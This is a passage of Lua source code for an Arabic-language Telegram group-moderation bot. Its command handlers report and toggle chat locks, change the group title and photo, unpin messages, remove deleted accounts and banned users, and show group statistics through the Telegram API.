if text == "الروابط" then if DevaMeR:get(LanZo..'aMeR:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙الروابط ↫ "..mute_links.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevaMeR:get(LanZo..'aMeR:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙المعرف ↫ "..lock_tag.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevaMeR:get(LanZo..'aMeR:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙المتحركه ↫ "..mute_gifs.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الملصقات" then if DevaMeR:get(LanZo..'aMeR:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙الملصقات ↫ "..lock_sticker.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الصور" then if DevaMeR:get(LanZo..'aMeR:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙الصور ↫ "..mute_photo.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevaMeR:get(LanZo..'aMeR:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙الفيديو ↫ "..mute_video.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الاونلاين" then if DevaMeR:get(LanZo..'aMeR:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local LanZoTeam = "\n" .."᥀︙الاونلاين ↫ "..mute_in.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الدردشه" then if DevaMeR:get(LanZo..'aMeR:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙الدردشه ↫ "..mute_text.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevaMeR:get(LanZo..'aMeR:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local LanZoTeam = "\n" .."᥀︙التوجيه ↫ "..lock_forward.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الاغاني" then if DevaMeR:get(LanZo..'aMeR:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙الاغاني ↫ "..mute_music.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevaMeR:get(LanZo..'aMeR:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local LanZoTeam = "\n" .."᥀︙الصوت ↫ "..mute_voice.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevaMeR:get(LanZo..'aMeR:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙الجهات ↫ "..lock_contact.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الماركداون" then if DevaMeR:get(LanZo..'aMeR:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local LanZoTeam = "\n" .."᥀︙الماركداون ↫ "..markdown.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الهاشتاك" then if DevaMeR:get(LanZo..'aMeR:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local LanZoTeam = "\n" .."᥀︙الهاشتاك ↫ "..lock_htag.."\n"Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "التعديل" then if DevaMeR:get(LanZo..'aMeR:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local LanZoTeam = "\n" .."᥀︙التعديل ↫ "..mute_edit.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "التثبيت" then if DevaMeR:get(LanZo..'aMeR:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local LanZoTeam = "\n" .."᥀︙التثبيت ↫ "..lock_pin.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الاشعارات" then if DevaMeR:get(LanZo..'aMeR:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الكلايش" then if DevaMeR:get(LanZo..'aMeR:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙الكلايش ↫ "..lock_spam.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الدخول" then if DevaMeR:get(LanZo..'aMeR:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local LanZoTeam = "\n" .."᥀︙الدخول ↫ "..lock_Join.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الشبكات" then if DevaMeR:get(LanZo..'aMeR:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙الشبكات ↫ "..lock_wp.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "المواقع" then if DevaMeR:get(LanZo..'aMeR:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙المواقع ↫ "..lock_location.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "العربيه" then if DevaMeR:get(LanZo..'aMeR:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙العربيه ↫ "..lock_arabic.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الانكليزيه" then if DevaMeR:get(LanZo..'aMeR:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local LanZoTeam = "\n" .."᥀︙الانكليزيه ↫ "..lock_english.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الكفر" then if DevaMeR:get(LanZo..'aMeR:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local LanZoTeam = "\n" .."᥀︙الكفر ↫ "..lock_kaf.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الفشار" then if DevaMeR:get(LanZo..'aMeR:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local LanZoTeam = "\n" .."᥀︙الفشار ↫ "..lock_fshar.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
if text == "الطائفيه" then if DevaMeR:get(LanZo..'aMeR:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local LanZoTeam = "\n" .."᥀︙الطائفيه ↫ "..lock_taf.."\n" Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam, 1, 'md') end
end
--     Source LanZo     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل كشف الاعدادات'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل كشف الاعدادات'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:LockSettings'..msg.chat_id_) 
end
--     Source LanZo     --
if text and (text == 'تعطيل التحقق' or text == 'قفل التحقق' or text == 'تعطيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل التحقق بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Lock:Robot'..msg.chat_id_)
end
if text and (text == 'تفعيل التحقق' or text == 'فتح التحقق' or text == 'تفعيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل التحقق بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Lock:Robot'..msg.chat_id_,true)
end
--     Source LanZo     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل ردود المدير'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل ردود المدير'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Lock:GpRed'..msg.chat_id_,true)
end
--     Source LanZo     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل ردود المطور'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل ردود المطور'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Lock:AllRed'..msg.chat_id_,true)
end
--     Source LanZo     --
if aMeRSudo(msg) then
if text == 'تفعيل المغادره' or text == '↫ تفعيل المغادره ᥀' and ChCheck(msg) then 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل المغادره بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo.."aMeR:Left:Bot"..LanZo)
end
if text == 'تعطيل المغادره' or text == '↫ تعطيل المغادره ᥀' and ChCheck(msg) then 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل المغادره بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo.."aMeR:Left:Bot"..LanZo,true) 
end 
if text == 'تفعيل الاذاعه' or text == '↫ تفعيل الاذاعه ᥀' and ChCheck(msg) then 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الاذاعه بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo.."aMeR:Send:Bot"..LanZo)
end
if text == 'تعطيل الاذاعه' or text == '↫ تعطيل الاذاعه ᥀' and ChCheck(msg) then 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الاذاعه بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo.."aMeR:Send:Bot"..LanZo,true) 
end
end
--     Source LanZo     --
if text and text:match("^ضع اسم (.*)$") and Manager(msg) and ChCheck(msg) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = txt[2] },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"᥀︙البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"᥀︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات")  
else
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تغير اسم المجموعه'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
end
end,nil) 
end
--     Source LanZo     --
if msg.content_.photo_ then
if DevaMeR:get(LanZo..'aMeR:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"᥀︙عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا") 
DevaMeR:del(LanZo..'aMeR:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"᥀︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevaMeR:del(LanZo..'aMeR:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
else
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تغير صورة المجموعه'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
end
end,nil) 
DevaMeR:del(LanZo..'aMeR:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
end 
end
if text and text:match("^ضع صوره$") and ChCheck(msg) or text and text:match("^وضع صوره$") and ChCheck(msg) then
Dev_aMeR(msg.chat_id_,msg.id_, 1, '᥀︙ارسل صورة المجموعه الان', 1, 'md')
DevaMeR:set(LanZo..'aMeR:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source LanZo     --
if text and text:match("^حذف الصوره$") and ChCheck(msg) or text and text:match("^مسح الصوره$") and ChCheck(msg) then
https.request("https://api.telegram.org/bot"..TokenBot.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف صورة المجموعه")  
return false  
end
--     Source LanZo     --
if Manager(msg) then
if text and text:match("^الغاء تثبيت$") and ChCheck(msg) or text and text:match("^الغاء التثبيت$") and ChCheck(msg) then
if DevaMeR:sismember(LanZo.."aMeR:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_aMeR(msg.chat_id_,msg.id_, 1, "᥀︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
DevaMeR:del(LanZo..'aMeR:PinnedMsg'..msg.chat_id_)
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم الغاء تثبيت الرساله'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"᥀︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"᥀︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
--     Source LanZo     --
if text and text:match("^الغاء تثبيت الكل$") and ChCheck(msg) then  
if DevaMeR:sismember(LanZo.."aMeR:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_aMeR(msg.chat_id_,msg.id_, 1, "᥀︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم الغاء تثبيت الكل'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
https.request('https://api.telegram.org/bot'..TokenBot..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
DevaMeR:del(LanZo.."aMeR:PinnedMsg"..msg.chat_id_)
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"᥀︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"᥀︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
--     Source LanZo     --
if text and text:match("^اعاده تثبيت$") and ChCheck(msg) or text and text:match("^اعاده التثبيت$") and ChCheck(msg) or text and text:match("^اعادة التثبيت$") and ChCheck(msg) then
if DevaMeR:sismember(LanZo.."aMeR:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_aMeR(msg.chat_id_,msg.id_, 1, "᥀︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
local PinId = DevaMeR:get(LanZo..'aMeR:PinnedMsg'..msg.chat_id_)
if PinId then
Pin(msg.chat_id_,PinId,0)
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم اعادة تثبيت الرساله'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
end end
end
--     Source LanZo     --
if text == 'طرد المحذوفين' and ChCheck(msg) or text == 'مسح المحذوفين' and ChCheck(msg) or text == 'طرد الحسابات المحذوفه' and ChCheck(msg) or text == 'حذف المحذوفين' and ChCheck(msg) then  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
ChatKick(msg.chat_id_, data.id_)
end
end,nil)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم طرد المحذوفين")  
end,nil)
end
--     Source LanZo     --
if text and text:match("^مسح المحظورين$") or text and text:match("^حذف المحظورين$") and ChCheck(msg) or text and text:match("^مسح المطرودين$") or text and text:match("^حذف المطرودين$") and ChCheck(msg) then
local function RemoveBlockList(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_aMeR(msg.chat_id_, msg.id_, 0,'᥀︙*لا يوجد محظورين*', 1, 'md')
DevaMeR:del(LanZo..'aMeR:Ban:'..msg.chat_id_)
else
local x = 0
for x,y in pairs(result.members_) do
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
DevaMeR:del(LanZo..'aMeR:Ban:'..msg.chat_id_)
x = x + 1
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف المحظورين")  
end
end
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, RemoveBlockList, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
end
end
--     Source LanZo     --
if text and text:match("^معلومات المجموعه$") and ChCheck(msg) or text and text:match("^عدد الاعضاء$") and ChCheck(msg) or text and text:match("^عدد الكروب$") and ChCheck(msg) or text and text:match("^عدد الادمنيه$") and ChCheck(msg) or text and text:match("^عدد المحظورين$") and ChCheck(msg) then
local Muted = DevaMeR:scard(LanZo.."aMeR:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه ↫ ❨ '..dp.title_..' ❩\n᥀︙الايدي ↫ ❨ '..msg.chat_id_..' ❩\n᥀︙عدد الاعضاء ↫ ❨ *'..data.member_count_..'* ❩\n᥀︙عدد الادمنيه ↫ ❨ *'..data.administrator_count_..'* ❩\n᥀︙عدد المطرودين ↫ ❨ *'..data.kicked_count_..'* ❩\n᥀︙عدد المكتومين ↫ ❨ *'..Muted..'* ❩\n᥀︙عدد رسائل المجموعه ↫ ❨ *'..(msg.id_/2097152/0.5)..'* ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n', 1, 'md') 
end,nil)
end,nil)
end
--     Source LanZo     --
if text and text:match('^كشف (-%d+)') and ChCheck(msg) then
local ChatId = text:match('كشف (-%d+)') 
if not SudoBot(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطورين فقط', 1, 'md')
else
local ConstructorList = DevaMeR:scard(LanZo.."aMeR:Constructor:"..ChatId) or 0
local BanedList = DevaMeR:scard(LanZo.."aMeR:Ban:"..ChatId) or 0
local ManagerList = DevaMeR:scard(LanZo.."aMeR:Managers:"..ChatId) or 0
local MutedList = DevaMeR:scard(LanZo.."aMeR:Muted:"..ChatId) or 0
local TkeedList = DevaMeR:scard(LanZo.."aMeR:aMeR:Tkeed:"..ChatId) or 0
local AdminsList = DevaMeR:scard(LanZo.."aMeR:Admins:"..ChatId) or 0
local VipList = DevaMeR:scard(LanZo.."aMeR:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/Bw5Bw' end
tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
if dp.id_ then
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,aMeR) 
if aMeR.first_name_ ~= false then
ConstructoraMeR = "["..aMeR.first_name_.."](T.me/"..(aMeR.username_ or "Bw5Bw")..")"
else 
ConstructoraMeR = "حساب محذوف"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙المجموعه ↫ ["..dp.title_.."]("..LinkGroup..")\n᥀︙الايدي ↫ ( `"..ChatId.."` )\n᥀︙المنشئ ↫ "..ConstructoraMeR.."\n᥀︙عدد المدراء ↫ ( *"..ManagerList.."* )\n᥀︙عدد المنشئين ↫ ( *"..ConstructorList.."* )\n᥀︙عدد الادمنيه ↫ ( *"..AdminsList.."* )\n᥀︙عدد المميزين ↫ ( *"..VipList.."* )\n᥀︙عدد المحظورين ↫ ( *"..BanedList.."* )\n᥀︙عدد المقيدين ↫ ( *"..TkeedList.."* )\n᥀︙عدد المكتومين ↫ ( *"..MutedList.."* )", 1,"md")
end,nil)
end
end
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لم تتم اضافتي بها لاقوم بكشفها", 1, "md")
end
end,nil)
end,nil)
end 
end
--     Source LanZo     --
if text and text:match("^غادر (-%d+)$") and ChCheck(msg) then
local Text = { string.match(text, "^(غادر) (-%d+)$")}
if not SecondSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط', 1, 'md')
else 
tdcli_function({ID ="GetChat",chat_id_=Text[2]},function(arg,dp) 
if dp.id_ then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙المجموعه ↫ ["..dp.title_.."]\n᥀︙تمت المغادره منها بنجاح", 1, "md")
Dev_aMeR(Text[2], 0, 1, "᥀︙بامر المطور تم مغادرة هذه المجموعه ", 1, "md")  
ChatLeave(dp.id_, LanZo)
DevaMeR:srem(LanZo.."aMeR:Groups", dp.id_)
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لم تتم اضافتي بها لاقوم بمغادرتها", 1, "md")
end 
end,nil)
end 
end
--     Source LanZo     --
if text and text:match("^تعين عدد الاعضاء (%d+)$") and SecondSudo(msg) or text and text:match("^تعيين عدد الاعضاء (%d+)$") and SecondSudo(msg) then
local Num = text:match("تعين عدد الاعضاء (%d+)$") or text:match("تعيين عدد الاعضاء (%d+)$")
DevaMeR:set(LanZo..'aMeR:Num:Add:Bot',Num) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم وضع عدد الاعضاء ↫ *'..Num..'* عضو', 1, 'md')
end
--     Source LanZo     --
if text == 'تفعيل البوت الخدمي' and ChCheck(msg) or text == '↫ تفعيل البوت الخدمي ᥀' and ChCheck(msg) then 
if not aMeRSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط', 1, 'md')
else 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل البوت الخدمي'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Lock:FreeBot'..LanZo) 
end 
end
if text == 'تعطيل البوت الخدمي' and ChCheck(msg) or text == '↫ تعطيل البوت الخدمي ᥀' and ChCheck(msg) then 
if not aMeRSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط', 1, 'md')
else 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل البوت الخدمي'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Lock:FreeBot'..LanZo,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'تعطيل صورتي' and Manager(msg) and ChCheck(msg) then   
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل صورتي بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Photo:Profile'..msg.chat_id_) 
end
if text == 'تفعيل صورتي' and Manager(msg) and ChCheck(msg) then  
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل صورتي بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Photo:Profile'..msg.chat_id_,true)  
end
